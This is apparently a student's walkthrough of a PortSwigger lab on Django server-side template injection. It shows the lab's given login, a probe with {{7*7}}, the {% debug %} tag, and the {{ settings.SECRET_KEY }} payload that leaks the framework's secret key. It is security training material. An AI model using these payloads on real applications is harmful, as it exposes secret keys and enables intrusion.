
# #PortSwigger 


![[Pasted image 20251214131750.png]]


## Lab Description

This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

**Objective:** Steal and submit the framework's secret key.

**Credentials:** `content-manager:C0nt3ntM4n4g3r`

---
---


### Step 1: Log In

1. Log in with credentials:
    - **Username:** `content-manager`
    - **Password:** `C0nt3ntM4n4g3r`

---

### Step 2: Find the Template Injection Point

1. Navigate to a product page
2. Look for the option to **edit the product description template**
3. This is where template injection occurs

---

### Step 3: Identify the Template Engine

**Test with invalid syntax:**
```
{{7*7}}
```


![[Pasted image 20251214132940.png]]

**Error response** , Template engine identified: **Django**

*django engine we have
![[Pasted image 20251214133010.png]]



![[Pasted image 20251214133509.png]]



---

### Step 4: Use the `debug` Template Tag

**Payload:**
```
{% debug %}
```

**This outputs:**
- A list of accessible objects and properties
- The `settings` object is exposed

![[Pasted image 20251214133539.png]]


---

### Step 5: Access the Secret Key

**Payload:**
```
{{ settings.SECRET_KEY }}
```

The secret key is leaked!
![[Pasted image 20251214133601.png]]

*Secret Key*
```
0f82onez4c0un9txvcwpdxxkv17dwar4o
```


---

### Step 6: Submit the Secret Key

1. Click the **Submit solution** button
2. Enter the secret key: `0f82onez4c0un9txvcwpdxxkv17dwar4o`
3. Click **OK**

![[Pasted image 20251214133717.png]]


---

### Step 7: Lab Solved

![[Pasted image 20251214133728.png]]


---
----
